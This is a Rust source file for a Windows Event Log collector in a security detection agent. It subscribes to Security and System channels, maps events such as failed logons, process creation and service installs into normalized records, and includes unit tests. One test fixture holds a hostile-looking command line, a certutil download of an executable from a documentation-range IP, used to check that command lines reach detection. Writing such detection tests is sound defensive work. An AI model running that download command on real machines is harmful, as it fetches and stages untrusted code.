//! Windows Event Log source.
//!
//! Subscribes with `EvtSubscribe` (pull model, signalled by an event object)
//! to the Security and System channels, filtered in the query to the event IDs
//! the detection core uses, and renders each record as XML. A bookmark is
//! saved in the state directory after each batch is spooled, so a restart
//! resumes after the last record it shipped. This replaces the Python live
//! agent's `wevtutil` polling.
//!
//! [`map_event_xml`] is pure and tested on every OS; the subscription loop
//! only builds on Windows.

use lsadra_collector_core::time::now_rfc3339;
use lsadra_collector_core::{event::validate_timestamp, Event};

/// Security-channel event IDs and their normalized event types.
pub const SECURITY_EVENTS: &[(u32, &str)] = &[
    (4624, "logon_success"),
    (4625, "logon_failure"),
    (4648, "explicit_credential_logon"),
    (4672, "special_privileges_logon"),
    (4688, "process_create"),
    (4697, "service_installed"),
    (4698, "scheduled_task_created"),
    (4720, "user_account_created"),
    (4726, "user_account_deleted"),
    (4732, "group_member_added"),
    (1102, "audit_log_cleared"),
];

/// System-channel event IDs.
pub const SYSTEM_EVENTS: &[(u32, &str)] = &[(7045, "service_installed"), (104, "event_log_cleared")];

/// The subscription query: only the IDs above, so filtering happens in the
/// event log service and the agent never sees the rest.
pub fn default_query() -> String {
    let ids = |list: &[(u32, &str)]| {
        list.iter()
            .map(|(id, _)| format!("EventID={id}"))
            .collect::<Vec<_>>()
            .join(" or ")
    };
    format!(
        "<QueryList><Query Id=\"0\">\
         <Select Path=\"Security\">*[System[({})]]</Select>\
         <Select Path=\"System\">*[System[({})]]</Select>\
         </Query></QueryList>",
        ids(SECURITY_EVENTS),
        ids(SYSTEM_EVENTS)
    )
}

/// Well-known service accounts whose logons are routine noise.
const SERVICE_SIDS: &[&str] = &["S-1-5-18", "S-1-5-19", "S-1-5-20"];

fn logon_type_name(t: &str) -> &'static str {
    match t {
        "2" => "Interactive",
        "3" => "Network",
        "4" => "Batch",
        "5" => "Service",
        "7" => "Unlock",
        "8" => "NetworkCleartext",
        "9" => "NewCredentials",
        "10" => "RemoteInteractive",
        "11" => "CachedInteractive",
        _ => "",
    }
}

fn meaningful(v: &str) -> &str {
    match v.trim() {
        "-" | "" => "",
        s => s,
    }
}

/// Map one rendered event (XML) to a schema v1 event, or `None` when it is not
/// one of ours or is routine service-account noise.
pub fn map_event_xml(xml: &str) -> Option<Event> {
    let doc = roxmltree::Document::parse(xml).ok()?;
    let root = doc.root_element();
    let system = root.children().find(|n| n.has_tag_name("System"))?;
    let sys = |name: &str| system.children().find(|n| n.has_tag_name(name));

    let event_id: u32 = sys("EventID")?.text()?.trim().parse().ok()?;
    let channel = sys("Channel").and_then(|n| n.text()).unwrap_or("").to_string();
    let table = if channel.eq_ignore_ascii_case("System") {
        SYSTEM_EVENTS
    } else {
        SECURITY_EVENTS
    };
    let event_type = table.iter().find(|(id, _)| *id == event_id)?.1;

    let data: Vec<(String, String)> = root
        .descendants()
        .filter(|n| n.has_tag_name("Data"))
        .map(|n| {
            (
                n.attribute("Name").unwrap_or("").to_string(),
                n.text().unwrap_or("").to_string(),
            )
        })
        .collect();
    let get = |k: &str| {
        data.iter()
            .find(|(n, _)| n == k)
            .map(|(_, v)| meaningful(v))
            .unwrap_or("")
    };

    // Drop the logons Windows makes for itself every few seconds.
    if matches!(event_id, 4624 | 4672) {
        let sid = if event_id == 4624 {
            get("TargetUserSid")
        } else {
            get("SubjectUserSid")
        };
        if SERVICE_SIDS.contains(&sid) || (event_id == 4624 && get("LogonType") == "5") {
            return None;
        }
    }

    let ts_raw = sys("TimeCreated")
        .and_then(|n| n.attribute("SystemTime"))
        .unwrap_or("");
    let ts = if validate_timestamp(ts_raw).is_ok() {
        ts_raw.to_string()
    } else {
        now_rfc3339()
    };
    let computer = sys("Computer").and_then(|n| n.text()).unwrap_or("");
    let record_id = sys("EventRecordID").and_then(|n| n.text()).unwrap_or("");

    let user = match event_id {
        4624 | 4625 | 4648 => get("TargetUserName"),
        4732 => get("SubjectUserName"),
        _ => get("SubjectUserName"),
    };

    let mut e = Event::new(ts, event_type)
        .host(computer)
        .username(user)
        .source_ip(get("IpAddress"))
        .raw(xml.trim())
        .attr("source", "wineventlog")
        .attr("event_id", &event_id.to_string())
        .attr("channel", &channel)
        .attr("record_id", record_id)
        .attr("logon_type", logon_type_name(get("LogonType")))
        .attr("target_domain", get("TargetDomainName"))
        .attr("workstation", get("WorkstationName"))
        .attr("source_port", get("IpPort"))
        .attr("failure_status", get("Status"))
        .attr("failure_substatus", get("SubStatus"))
        .attr("process_name", get("NewProcessName"))
        .attr("command_line", get("CommandLine"))
        .attr("parent_process", get("ParentProcessName"))
        .attr("task_name", get("TaskName"))
        .attr("service_name", get("ServiceName"))
        .attr(
            "image_path",
            if get("ImagePath").is_empty() {
                get("ServiceFileName")
            } else {
                get("ImagePath")
            },
        )
        .attr("member", get("MemberName"));
    if matches!(event_id, 4720 | 4726 | 4732) {
        e = e.attr("target_account", get("TargetUserName"));
    }
    e.validate().ok()?;
    Some(e)
}

#[cfg(windows)]
mod subscribe;
#[cfg(windows)]
pub use subscribe::WinEventLogSource;

#[cfg(test)]
mod tests {
    use super::*;

    const NS: &str = "http://schemas.microsoft.com/win/2004/08/events/event";

    fn xml(id: u32, channel: &str, data: &[(&str, &str)]) -> String {
        let fields: String = data
            .iter()
            .map(|(k, v)| format!("<Data Name=\"{k}\">{v}</Data>"))
            .collect();
        format!(
            "<Event xmlns=\"{NS}\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/>\
             <EventID>{id}</EventID><TimeCreated SystemTime=\"2026-01-15T02:01:12.1234567Z\"/>\
             <EventRecordID>9001</EventRecordID><Channel>{channel}</Channel>\
             <Computer>demo-host-07.demo</Computer></System><EventData>{fields}</EventData></Event>"
        )
    }

    #[test]
    fn failed_logon() {
        let e = map_event_xml(&xml(
            4625,
            "Security",
            &[
                ("TargetUserName", "alice.demo"),
                ("TargetDomainName", "DEMO"),
                ("LogonType", "3"),
                ("IpAddress", "198.51.100.7"),
                ("IpPort", "51515"),
                ("Status", "0xc000006d"),
            ],
        ))
        .unwrap();
        assert_eq!(e.event_type, "logon_failure");
        assert_eq!(e.timestamp, "2026-01-15T02:01:12.1234567Z");
        assert_eq!(e.host.as_deref(), Some("demo-host-07.demo"));
        assert_eq!(e.effective_username.as_deref(), Some("alice.demo"));
        assert_eq!(e.source_ip.as_deref(), Some("198.51.100.7"));
        assert_eq!(e.attributes["logon_type"], "Network");
        assert_eq!(e.attributes["event_id"], "4625");
        assert_eq!(e.attributes["record_id"], "9001");
    }

    #[test]
    fn service_install_on_system_channel() {
        let e = map_event_xml(&xml(
            7045,
            "System",
            &[("ServiceName", "updater-demo"), ("ImagePath", "C:\\Temp\\u.exe")],
        ))
        .unwrap();
        assert_eq!(e.event_type, "service_installed");
        assert_eq!(e.attributes["image_path"], "C:\\Temp\\u.exe");
    }

    #[test]
    fn process_create_keeps_command_line() {
        let e = map_event_xml(&xml(
            4688,
            "Security",
            &[
                ("SubjectUserName", "bob.demo"),
                ("NewProcessName", "C:\\Windows\\System32\\certutil.exe"),
                ("CommandLine", "certutil -urlcache -f http://192.0.2.9/a a.exe"),
            ],
        ))
        .unwrap();
        assert_eq!(e.event_type, "process_create");
        assert_eq!(e.effective_username.as_deref(), Some("bob.demo"));
        assert!(e.attributes["command_line"]
            .as_str()
            .unwrap()
            .contains("certutil"));
    }

    #[test]
    fn system_logons_are_noise() {
        assert!(map_event_xml(&xml(
            4624,
            "Security",
            &[("TargetUserSid", "S-1-5-18"), ("LogonType", "5")]
        ))
        .is_none());
        assert!(map_event_xml(&xml(
            4624,
            "Security",
            &[("TargetUserName", "svc"), ("LogonType", "5")]
        ))
        .is_none());
        assert!(map_event_xml(&xml(4672, "Security", &[("SubjectUserSid", "S-1-5-18")])).is_none());
        assert!(map_event_xml(&xml(
            4624,
            "Security",
            &[("TargetUserName", "alice.demo"), ("LogonType", "10")]
        ))
        .is_some());
    }

    #[test]
    fn unknown_ids_dashes_and_bad_xml() {
        assert!(map_event_xml(&xml(4800, "Security", &[])).is_none());
        assert!(map_event_xml("<Event><System>").is_none());
        let e = map_event_xml(&xml(
            4625,
            "Security",
            &[("TargetUserName", "x"), ("IpAddress", "-")],
        ))
        .unwrap();
        assert_eq!(e.source_ip, None);
        assert!(!e.attributes.contains_key("source_port"));
    }

    #[test]
    fn huge_event_still_fits_the_contract() {
        let big = "A".repeat(20_000);
        let e = map_event_xml(&xml(
            4688,
            "Security",
            &[("SubjectUserName", "x"), ("CommandLine", &big)],
        ))
        .unwrap();
        e.validate().unwrap();
    }

    #[test]
    fn query_lists_both_channels() {
        let q = default_query();
        assert!(q.contains("Path=\"Security\"") && q.contains("EventID=4625"));
        assert!(q.contains("Path=\"System\"") && q.contains("EventID=7045"));
    }
}
